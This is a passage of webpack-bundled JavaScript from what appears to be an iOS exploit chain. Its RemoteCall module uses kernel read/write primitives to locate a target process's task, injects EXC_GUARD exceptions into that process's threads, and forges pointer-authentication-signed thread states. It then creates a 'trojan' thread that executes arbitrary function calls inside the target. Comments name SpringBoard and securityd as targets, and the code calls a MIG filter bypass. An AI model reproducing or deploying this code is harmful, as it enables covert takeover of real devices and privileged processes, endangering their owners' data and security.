        if (index >= this.length || index < 0) {
            console.log(TAG,`Got wrong index in get:${index}`);
			return;
        }
        return this.#dataView.getBigUint64(index * 8, true); // true for little-endian
    }

    set(index, value) {
        if (index >= this.length || index < 0) {
            console.log(TAG,`Got wrong index in set`);
			return;
        }
        this.#dataView.setBigUint64(index * 8, BigInt(value), true); // true for little-endian
    }
}

/***/ }),

/***/ "./src/libs/TaskRop/RemoteCall.js":
/*!****************************************!*\
  !*** ./src/libs/TaskRop/RemoteCall.js ***!
  \****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ RemoteCallWithRetry)
/* harmony export */ });
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var _Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var _Thread__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./Thread */ "./src/libs/TaskRop/Thread.js");
/* harmony import */ var _Exception__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./Exception */ "./src/libs/TaskRop/Exception.js");
/* harmony import */ var _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./ExceptionMessageStruct */ "./src/libs/TaskRop/ExceptionMessageStruct.js");
/* harmony import */ var _ThreadState__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./ThreadState */ "./src/libs/TaskRop/ThreadState.js");
/* harmony import */ var _PAC__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./PAC */ "./src/libs/TaskRop/PAC.js");
/* harmony import */ var _VM__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./VM */ "./src/libs/TaskRop/VM.js");
/* harmony import */ var _VMShmem__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! ./VMShmem */ "./src/libs/TaskRop/VMShmem.js");
/* harmony import */ var _MachMsgHeaderStruct__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! ./MachMsgHeaderStruct */ "./src/libs/TaskRop/MachMsgHeaderStruct.js");
/* harmony import */ var _PortRightInserter__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! ./PortRightInserter */ "./src/libs/TaskRop/PortRightInserter.js");


//import ExceptionThreadJS17 from '!raw-loader!./ExceptionThread17.js'
//import ExceptionThreadJS18 from '!raw-loader!./ExceptionThread18.js'

//import Offsets from "Driver/Offsets";

const TAG = "REMOTECALL"
const PE_RC_GAP_MS = 5000;
const PE_RC_FAIL_GAP_MS = 10000;
const PE_RC_RETRY_MS = 10000;
const PE_RC_RETRY_MAX = 2;
function peRcWaitGap(target, gapMs) {
	gapMs = Number(gapMs);
	if (!Number.isFinite(gapMs) || gapMs < 0) gapMs = PE_RC_GAP_MS;
	let lastWhy = "";
	try { lastWhy = String(globalThis.__pe_rc_last_why || ""); } catch (_) { lastWhy = ""; }
	if (lastWhy && lastWhy !== "ok")
		gapMs = Math.max(gapMs, PE_RC_FAIL_GAP_MS);
	let last = 0;
	try { last = Number(globalThis.__pe_rc_last_end_ts) || 0; } catch (_) { last = 0; }
	let wait = last > 0 ? (last + gapMs) - Date.now() : 0;
	if (wait > 50) {
		rcLog("pace wait " + wait + "ms before RC target=" + String(target || "") +
			" last=" + String(globalThis.__pe_rc_last_target || ""));
		try {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", BigInt(Math.floor(wait * 1000)));
		} catch (_) {
			try {
				libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep", BigInt(Math.max(1, Math.ceil(wait / 1000))));
			} catch (__) {}
		}
	}
}
function peRcMarkEnd(target, why) {
	try {
		globalThis.__pe_rc_last_end_ts = Date.now();
		globalThis.__pe_rc_last_target = String(target || "");
		globalThis.__pe_rc_last_why = String(why || "");
	} catch (_) {}
}
function rcLog(msg) {
	// RC pelog: head + end + hard fails only (no per-thread setExcPort spam).
	let s = String(msg == null ? "" : msg);
	let keep =
		s.indexOf("Getting task by") === 0 ||
		s.indexOf("pace wait") === 0 ||
		s.indexOf("retry wait") === 0 ||
		s.indexOf("getTaskAddr miss") === 0 ||
		s.indexOf("Finished for now") >= 0 ||
		s.indexOf("Exception injection failed") >= 0 ||
		s.indexOf("FAIL-FAST") >= 0 ||
		s.indexOf("once: abort") >= 0 ||
		s.indexOf("Cannot get taskAddr") >= 0 ||
		s.indexOf("Couldn't create exception") >= 0 ||
		s.indexOf("Task pid:") >= 0 ||
		s.indexOf("destroy soft") >= 0 ||
		s.indexOf("Failed to receive first exception (fail-fast") >= 0 ||
		s.indexOf("Couldn't resume newly created thread") >= 0 ||
		s.indexOf("Unable to find symbol") >= 0 ||
		s.indexOf("setExcPort helper pthread/mach invalid") >= 0 ||
		s.indexOf("Unable to read thread state") >= 0 ||
		s.indexOf("setExcPort setState FAIL") >= 0 ||
		s.indexOf("setExcPort resume FAIL") >= 0;
	if (!keep) return;
	try { console.log(TAG, s); } catch (_) {}
	try {
		if (typeof globalThis.LOG === "function")
			globalThis.LOG("[REMOTECALL] " + s);
	} catch (_) {}
}
const GUARD_TYPE_MACH_PORT = 0x1n;
const kGUARD_EXC_INVALID_RIGHT = BigInt(1 << 8);
const SWITCH_OPTION_NONE = 0n;
const fakePCTrojanCreator = 0x101n;
const fakeLRTrojanCreator = 0x201n;
const fakePCTrojan = 0x301n;
const fakeLRTrojan = 0x401n;
const __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK = 0xff000000n;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_IB_SIGNED_LR = 0x2;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC = 0x4;
const __DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_LR = 0x8;
const SHMEM_CACHE_SIZE = 100;
const MAP_PRIVATE = 0x0002n;
const MAP_ANON = 0x1000n;

class RemoteCall
{
	#taskAddr;
	#creatingExtraThread;
	#onceFailFast = false;
	#retryMs = PE_RC_RETRY_MS;
	#rcLabel = "";
	#firstExceptionPort;
	#secondExceptionPort;
	#firstExceptionPortAddr;
	#secondExceptionPortAddr;
	#dummyThread;
	#dummyThreadMach;
	#dummyThreadAddr;
	#dummyThreadTro;
	#selfThreadAddr;
	#selfThreadCtid;
	#trojanThreadAddr;
	#callThreadAddr;
	#originalState;
	#vmMap;
	#trojanMem;
	#localPort;
	#remotePort;
	#shmemCache = new Array(SHMEM_CACHE_SIZE);
	//#exceptionThreadCFString;
	#success = false;
	#threadList = [];
	#krwControlFd;
	#krwRwFd;
	#pid;

	// opts.once: one-shot inject (for securityd + SEC-Q). No sleep/retryFirstThread loops;
	// first setExcPort/inject failure with 0 successes -> abort; SEC-Q retries after interval.
	constructor(param, migFilterBypass=null, opts=null)
	{
		opts = opts || {};
		let once = !!(opts.once || opts.secq_once);
		this.#onceFailFast = once;
		let gapMs = Number(opts.gap_ms);
		if (!Number.isFinite(gapMs) || gapMs < 0) gapMs = PE_RC_GAP_MS;
		let retryMs = Number(opts.retry_ms);
		if (!Number.isFinite(retryMs) || retryMs <= 0) retryMs = PE_RC_RETRY_MS;
		this.#retryMs = retryMs;
		// One GetTask per constructor. Factory / queues own retry + fail gap.
		// Stacking addrTries here used to fire several SpringBoard attaches back-to-back.
		let addrTries = 1;
		let rcLabel = (typeof(param) == "string") ? param : ("pid:" + param);
		this.#rcLabel = rcLabel;
		peRcWaitGap(rcLabel, gapMs);
		if(typeof(param) == "string")
		{
			for (let ai = 1; ai <= addrTries; ai++) {
				rcLog(`Getting task by name: ${param}` + (once ? " (once/SEC-Q)" : "") +
					(ai > 1 ? (" try=" + ai + "/" + addrTries) : ""));
				this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByName(param);
				if (this.#taskAddr) break;
				rcLog("getTaskAddr miss name=" + param + " try=" + ai + "/" + addrTries);
				if (ai < addrTries) {
					rcLog("retry wait " + retryMs + "ms after getTaskAddr miss");
					try {
						libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", BigInt(retryMs * 1000));
					} catch (_) {}
				}
			}
			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
		}
		else
		{
			this.#pid = param;
			for (let ai = 1; ai <= addrTries; ai++) {
				rcLog(`Getting task by pid: ${param}` + (once ? " (once/SEC-Q)" : "") +
					(ai > 1 ? (" try=" + ai + "/" + addrTries) : ""));
				this.#taskAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getTaskAddrByPID(param);
				if (this.#taskAddr) break;
				rcLog("getTaskAddr miss pid=" + param + " try=" + ai + "/" + addrTries);
				if (ai < addrTries) {
					rcLog("retry wait " + retryMs + "ms after getTaskAddr miss");
					try {
						libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", BigInt(retryMs * 1000));
					} catch (_) {}
				}
			}
			//console.log(TAG,`taskAddr:${Utils.hex(this.#taskAddr)}`);
		}

		if(!this.#taskAddr)
		{
			rcLog(`Cannot get taskAddr, returning`);
			peRcMarkEnd(rcLabel, "no_taskaddr");
			return null;
		}

		/*
		let threadmMem = 0n;
		const buildVer = Offsets.getBuildVersion();
		if(buildVer && buildVer.startsWith("22"))
		{
			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS18.length + 1);
			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS18);
		}
		else
		{
			threadmMem = Native.callSymbol("malloc", ExceptionThreadJS17.length + 1);
			this.#exceptionThreadCFString = this.#writeCFStr(threadmMem, ExceptionThreadJS17);
		}
		//Native.callSymbol("free", threadmMem);
		*/

		let firstExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
		let secondExceptionPort = _Exception__WEBPACK_IMPORTED_MODULE_5__["default"].createPort();
	
		if (!firstExceptionPort || !secondExceptionPort)
		{
			rcLog(`Couldn't create exception ports`);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, firstExceptionPort, 0n, 0n);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_port_destruct", 0x203n, secondExceptionPort, 0n, 0n);
			peRcMarkEnd(this.#rcLabel || rcLabel, "no_exc_ports");
			return null;
		}
		// Make sure the task won't crash after we handle an exception
		_Task__WEBPACK_IMPORTED_MODULE_3__["default"].disableExcGuardKill(this.#taskAddr);

		let guardCode = 0n;
		guardCode = this.#EXC_GUARD_ENCODE_TYPE(guardCode, GUARD_TYPE_MACH_PORT);
		guardCode = this.#EXC_GUARD_ENCODE_FLAVOR(guardCode, kGUARD_EXC_INVALID_RIGHT);
		guardCode = this.#EXC_GUARD_ENCODE_TARGET(guardCode, 0xf503n);
		let firstPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(firstExceptionPort);
		let secondPortAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortAddr(secondExceptionPort);
		//console.log(TAG,`Exception port 1:${Utils.hex(firstExceptionPort)} with kAddr:${Utils.hex(firstPortAddr)}`);
		//console.log(TAG,`Exception port 2:${Utils.hex(secondExceptionPort)} with kAddr:${Utils.hex(secondPortAddr)}`);

		let dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let dummyFunc = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].dlsym("getpid");
		//console.log(TAG,`dummyFunc:${Utils.hex(dummyFunc)}`);
		
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
		dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
		let dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np",dummyThread));
		let dummyThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(dummyThreadMach);
		let dummyThreadTro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(dummyThreadAddr);
		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_thread_self"));
		let selfThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf);
		let selfThreadCtid = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getCtid(selfThreadAddr);
	
		//console.log(TAG,`Dummy thread:${Utils.hex(dummyThreadMach)}`);
		//console.log(TAG,`Dummy thread object:${Utils.hex(dummyThreadAddr)}`);
		//console.log(TAG,`Dummy thread tro:${Utils.hex(dummyThreadTro)}`);
	
		//console.log(TAG,`Self thread:${Utils.hex(threadSelf)}`);
		//console.log(TAG,`Self thread object:${Utils.hex(selfThreadAddr)}`);
		//console.log(TAG,`Guard exc code:${Utils.hex(guardCode)}`);
		//console.log(TAG,`Self thread ctid:${Utils.hex(selfThreadCtid)}`);
		
		this.#creatingExtraThread = true;
		this.#firstExceptionPort = firstExceptionPort;
		this.#secondExceptionPort = secondExceptionPort;
		this.#firstExceptionPortAddr = firstPortAddr;
		this.#secondExceptionPortAddr = secondPortAddr;
		this.#dummyThread = dummyThread;
		this.#dummyThreadMach = dummyThreadMach;
		this.#dummyThreadAddr = dummyThreadAddr;
		this.#dummyThreadTro = dummyThreadTro;
		this.#selfThreadAddr = selfThreadAddr;
		this.#selfThreadCtid = selfThreadCtid;
		let retryCount = 0;
		let validThreadCount = 0;
		let successThreadCount = 0;
		let firstThread = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(this.#taskAddr);
		let currThread = firstThread;
		// once: one pass, need 2 injects, no sleep/reset grind - SEC-Q owns retries.
		let maxValid = once ? 2 : 5;
		let maxRetry = once ? 1 : 3; // retryCount < 1 -> never enter reset path successfully beyond first attempt
		let abortOnce = () => {
			rcLog("once: abort RemoteCall ctor (SEC-Q will retry) injected=" + successThreadCount +
				" valid=" + validThreadCount);
			return true;
		};
	
		this.#trojanThreadAddr = firstThread;

		if (migFilterBypass)
			migFilterBypass.resume();
		
		while ( true && successThreadCount < 2 && validThreadCount < maxValid && retryCount < maxRetry)
		{
			let task = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTask(currThread);
			if (!task)
			{
				if (!validThreadCount)
				{
					if (once) { abortOnce(); break; }
					rcLog(`failed on getting first thread at all, resetting first thread and currThread`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else
					break;
			}
			//console.log(TAG,`Trying Inject EXC_GUARD on thread:${Utils.hex(currThread)} with tro task:${Utils.hex(task)}`);
			if (task == this.#taskAddr)
			{
				if (!this.#setExceptionPortOnThread(this.#firstExceptionPort, currThread, migFilterBypass))
				{
					rcLog(`Set exception port on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} failed, not injecting`);
					if (!validThreadCount)
					{
						if (once) { abortOnce(); break; }
						rcLog(`failed on first thread, resetting first thread and currThread`);
						firstThread = currThread = this.#retryFirstThread(migFilterBypass);
						retryCount++;
						continue;
					}
				}
				else
				{
					// Inject a EXC_GUARD exception on this thread
					if (!_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].injectGuardException(currThread, guardCode))
					{
						rcLog(`Inject EXC_GUARD on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} failed, not injecting`);
						if (!validThreadCount)
						{
							if (once) { abortOnce(); break; }
							rcLog(`failed on first thread, resetting first thread and currThread`);
							firstThread = currThread = this.#retryFirstThread(migFilterBypass);
							retryCount++;
							continue;
						}
					}
					else
					{
						successThreadCount++;
						this.#threadList.push(currThread);
						rcLog(`Inject EXC_GUARD on thread:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(currThread)} OK`);
					}
				}
				validThreadCount++;
			}
			else if (task && !validThreadCount)
			{
				if (once) { abortOnce(); break; }
				rcLog(`Got weird tro on first thread, resetting first thread and currThread`);
				firstThread = currThread = this.#retryFirstThread(migFilterBypass);
				retryCount++;
				continue;
			}

			let next = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].next(currThread);
			if (!next)
			{
				if (!validThreadCount) {
					if (once) { abortOnce(); break; }
					rcLog(`Got empty next thread on first thread. Retry`);
					firstThread = currThread = this.#retryFirstThread(migFilterBypass);
					retryCount++;
					continue;
				}
				else {
					rcLog("Break because of empty next thread");
					break;
				}
			}
			currThread = next;
		}

		if (migFilterBypass)
			migFilterBypass.pause();

		rcLog(`Valid threads: ${validThreadCount}`);
		rcLog(`Injected threads: ${successThreadCount}`);

		if (!this.#threadList.length) {
			rcLog("Exception injection failed. Aborting.");
			this.destroy();
			return null;
		}
		// pe-297: half-inject (Injected=1) then waited ~120s Don't-receive -> burn/reboot risk.
		// Need 2 EXC_GUARD threads for a healthy RC; fail-fast before waitException.
		if (successThreadCount < 2) {
			rcLog("FAIL-FAST Injected=" + successThreadCount + " < 2 - abort before waitException");
			this.destroy();
			return null;
		}

		let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		// Lengthened: healthy RC usually replies in seconds; once/SEC-Q allow more headroom.
		let waitExcMs = this.#onceFailFast ? 45000 : 30000;
		if(!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort,excBuffer,waitExcMs,false))
		{
			rcLog(`Failed to receive first exception (fail-fast ${waitExcMs / 1000}s)`);
			this.destroy();
			return null;
		}

		//console.log(TAG,`Got first exception succesfully`);
		let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
		let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
		// Save state to restore its execution after trojan thread creation TODO make it inside ThreadState to copy thread state to another variable
		let originalStateBuff = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ARM_THREAD_STATE64_SIZE);
		this.#originalState = new _ThreadState__WEBPACK_IMPORTED_MODULE_7__["default"](originalStateBuff);
		for(let i = 0; i < 29; i++)
		{
			this.#originalState.registers.set(i,exc.threadState.registers.get(i));
		}
		this.#originalState.opaque_fp = exc.threadState.opaque_fp;
		this.#originalState.opaque_lr = exc.threadState.opaque_lr;
		this.#originalState.opaque_sp = exc.threadState.opaque_sp;
		this.#originalState.opaque_pc = exc.threadState.opaque_pc;
		this.#originalState.cspr = exc.threadState.cspr;
		this.#originalState.opaque_flags = exc.threadState.opaque_flags;
	
		//console.log(TAG,`Clear EXC_GUARD from all other threads...`);

		for(let i = 0; i < this.#threadList.length;i++)
		{
			_Thread__WEBPACK_IMPORTED_MODULE_4__["default"].clearGuardException(this.#threadList[i]);
			//console.log(TAG,`Clear EXC_GUARD on thread:${Utils.hex(this.#threadList[i])} OK`);
		}
		rcLog(`Finish clearing EXC_GUARD from all other threads...`);
		let desiredTimeout = 1500;
		// Flush exceptions in other threads (is that really needed?)
		while (true)
		{
			let excBuffer = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
			if (!_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].waitException(this.#firstExceptionPort, excBuffer, desiredTimeout, false))
				break;
			let excRes = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(excBuffer,Number(_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].ExceptionMessageSize));
			let exc = new _ExceptionMessageStruct__WEBPACK_IMPORTED_MODULE_6__["default"](excRes);
			//threadClearGuardException(remoteCall->trojanThreadAddr);
			_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, exc.threadState,false);
		}
		//console.log(TAG,`finished flushing exceptions`);
		let newState = exc.threadState;
		//console.log(TAG,`gadget_pacia:${Utils.hex(PAC.gadget_pacia)}`);
		newState = this.#signState(firstThread, newState, fakePCTrojanCreator, fakeLRTrojanCreator);
		//console.log(TAG,`updated PC:${Utils.hex(newState.opaque_pc)} and LR:${Utils.hex(newState.opaque_lr)}`);
		_Exception__WEBPACK_IMPORTED_MODULE_5__["default"].replyWithState(exc, newState, false);
		//console.log(TAG,`Trojan thread created`);
		
		//console.log(TAG,`Test remote getpid()`);
		//let pidRemote = this.#doRemoteCallTemp(100, "getpid");
		//console.log(TAG,`pidRemote:${pidRemote}`);
		
		// Use stack as a temporary remote memory
		let trojanMemTemp = exc.threadState.opaque_sp & 0x7fffffffffn;
		//console.log(TAG,`Remote memory:${Utils.hex(trojanMemTemp)}`);
		
		// Substracting a bit from stack pointer to not corrupt original stack
		trojanMemTemp = trojanMemTemp - 0x100n;

		this.#vmMap = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getMap(this.#taskAddr);
		//console.log(TAG,`vmMap:${Utils.hex(this.#vmMap)}`);

		// Create a remote pthread that should always crash on first execution, so we can control it with exceptions.
		let remoteCrashSigned = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(this.#trojanThreadAddr, fakePCTrojan, 0n);
		//console.log(TAG,`remoteCrashSigned:${Utils.hex(remoteCrashSigned)}`);

		let ret = this.#doRemoteCallTemp(100, "pthread_create_suspended_np", trojanMemTemp, 0n, remoteCrashSigned);
		//console.log(TAG,`pthread_create_suspended_np:${Utils.hex(ret)}`);
		//VM.mocker(0x221d54,0xffffffdc08875500n);
		
		let pthreadAddr = this.read64(BigInt(trojanMemTemp));
		//console.log(TAG,`pthreadAddr:${Utils.hex(pthreadAddr)}`);
		
		// Get mach port of the new thread and set exception port on it.
		let callThreadPort = this.#doRemoteCallTemp(100, "pthread_mach_thread_np", pthreadAddr);
		//console.log(TAG,`Call thread port:${Utils.hex(callThreadPort)}`);

		if (callThreadPort == 0n)
		{
			rcLog(`Cannot find callThreadPort`);
			this.destroy();
			return null;
		}
		this.#callThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObjectOfTask(this.#taskAddr, BigInt(callThreadPort));
		//console.log(TAG,`Call thread addr:${Utils.hex(this.#callThreadAddr)}`);
		// Note that this exception port is not the same of the initial exception port we use for existing threads.

		if (migFilterBypass)
			migFilterBypass.resume();

		if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
		{
			rcLog(`Failed to set new exception port on newly created thread, trying one more time before giving up, creating new thread`);
			dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;	
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_create_suspended_np",dummyThread, null, dummyFunc, null);
			dummyThread = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(dummyThread);
			this.#dummyThreadMach = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("pthread_mach_thread_np",dummyThread));
			this.#dummyThreadAddr = _Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(this.#dummyThreadMach);
			this.#dummyThreadTro = _Thread__WEBPACK_IMPORTED_MODULE_4__["default"].getTro(this.#dummyThreadAddr);
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep",1n);
			if (!this.#setExceptionPortOnThread(this.#secondExceptionPort, this.#callThreadAddr, migFilterBypass))
			{
				if (migFilterBypass)
					migFilterBypass.pause();
				this.destroy();
				return null;
			}
		}

		if (migFilterBypass)
			migFilterBypass.pause();
		
		rcLog(`All good so far! Now we resume trojan thread...`);

		// Ok, now we are ready to start this thread and catch exceptions on it.
		ret = this.#doRemoteCallTemp(100, "thread_resume", callThreadPort);
		//console.log(TAG,`thread_resume():${ret}`);
		if (ret !== 0n)
		{
			rcLog(`Couldn't resume newly created thread, falling back to use original one only`);
			this.#creatingExtraThread = false;
		}

		if (this.#creatingExtraThread)
		{
			rcLog(`New thread created succesfully, resuming original`);
			this.#restoreTrojanThread(this.#originalState);
		}
		rcLog(`Original thread restored succesfully`);

		// From this point on, the "stable" trojan thread is ready to process calls.
		//console.log(TAG, `Original thread restored succesfully, testing getpid on stable primitive`);
		this.#pid = this.#doRemoteCallStable(100, "getpid");
		rcLog(`Task pid: ${this.#pid}`);
		
		//this.#trojanMem = trojanMemTemp;
		//this.#testRWPrim();

		// Allocate a general purpose remote page mem.
		this.#trojanMem = this.#doRemoteCallStable(1000,"mmap", 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE, _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_READ | _VM__WEBPACK_IMPORTED_MODULE_9__["default"].VM_PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n);
		//console.log(TAG,`Newly mapped memory:${Utils.hex(this.#trojanMem)}`);
		
		// Memory must be written at least once (COW) to be found in vmMap.
		this.#doRemoteCallStable(100,"memset",this.#trojanMem, 0n, libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].PAGE_SIZE);

		this.#success = true;

		rcLog(`Finished for now succesfully`);
	}

	success() {
		return this.#success;
	}

	krwCtx() {
		return {
			controlFd: this.#krwControlFd,
			rwFd: this.#krwRwFd
		};
	}

	pid() {
		return this.#pid;
	}

	#testRWPrim()
	{
		rcLog(`Testing RW prim`);
		let arr = new ArrayBuffer(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		let arrView = new DataView(arr);
		arrView.setBigUint64(0,0x41414141n,true);
		let memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(memBuff,arr);
		this.write(BigInt(this.#trojanMem),memBuff,BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
		memBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x100n;
		this.read(BigInt(this.#trojanMem),memBuff,BigInt(libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE));
		let resBuff = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read(memBuff,libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].UINT64_SIZE);
		let resView = new DataView(resBuff);
		let result = resView.getBigUint64(0,true);
		rcLog(`Got result from Buffer of:${libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].hex(result)}`);
	}

	#retryFirstThread(migFilterBypass) {
		if (migFilterBypass)
			migFilterBypass.pause();
		let waitMs = Number(this.#retryMs);
		if (!Number.isFinite(waitMs) || waitMs <= 0) waitMs = PE_RC_RETRY_MS;
		rcLog("retry wait " + waitMs + "ms before first-thread reset");
		try {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("usleep", BigInt(Math.floor(waitMs * 1000)));
		} catch (_) {
			libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("sleep", BigInt(Math.max(1, Math.ceil(waitMs / 1000))));
		}
		if (migFilterBypass)
			migFilterBypass.resume();
		return _Task__WEBPACK_IMPORTED_MODULE_3__["default"].firstThread(this.#taskAddr);
	}

	#signState(SigningThread,state,pc,lr)
	{
		//console.log(TAG,`state.opaque_flags:${Utils.hex(state.opaque_flags)}`);
		let diver = BigInt(state.opaque_flags) & __DARWIN_ARM_THREAD_STATE64_USER_DIVERSIFIER_MASK;
		//console.log(TAG,`diver after:${Utils.hex(diver)}`);
		let discPC = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("pc"));
		let discLR = libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_blend_discriminator(BigInt(diver), libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_0__["default"].ptrauth_string_discriminator_special("lr"));
		//console.log(TAG,`discPC:${Utils.hex(discPC)}`);
		//console.log(TAG,`discLR:${Utils.hex(discLR)}`);
		/* C wrapper for ptrauth utils
		discPC = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver),Utils.ptrauth_string_discriminator("pc"));
		discLR = Native.callSymbol("wrapper_ptrauth_blend_discriminator",BigInt(diver), Utils.ptrauth_string_discriminator("lr"));
		rcLog(`discPC after:${Utils.hex(discPC)}`);
		rcLog(`discLR after:${Utils.hex(discLR)}`);
		*/
		if (pc)
		{
			state.opaque_flags &= ~(__DARWIN_ARM_THREAD_STATE64_FLAGS_KERNEL_SIGNED_PC);
			state.opaque_pc = _PAC__WEBPACK_IMPORTED_MODULE_8__["default"].remotePAC(SigningThread, pc, discPC);
		}
		if (lr)
		{
			state.opaque_flags &= ~(
